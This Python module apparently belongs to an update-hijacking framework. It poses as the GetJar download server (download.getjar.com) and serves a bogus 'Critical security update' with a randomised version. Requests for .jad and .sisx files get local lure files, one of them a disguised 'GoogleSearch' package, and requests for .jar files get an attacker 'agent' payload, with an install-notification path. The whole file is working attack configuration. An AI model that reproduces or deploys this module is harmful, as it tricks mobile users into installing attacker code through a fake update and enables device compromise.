from modules import ModuleBase


class GetJar(ModuleBase):
    name = 'getjar'
    version = '1.0'
    appver = '< 1.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(download.getjar.com)' 
    agent_filename = './include/getjar/j2me.jar'
    options = {
        'description': {
            'val': 'Critical security update',
            'desc': 'Description display in the update'
        },
        'version': {
            'val': "'30.' + rand_num(1) + '.' + rand_num(4) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '.jad$', 
            'type': 'file',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/getjar/j2me.jad',
        },{
            'path': '.sisx$',
            'type': 'file',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': './include/getjar/GoogleSearch_v2.1.12_getjar.sisx',
        }, {
            'path': '.jar$',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string' : "",
            'parse': 0,
            'file': '',
        }, {
            'path': '/JarInstallNotify',
            'type': 'install',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': '',
        }]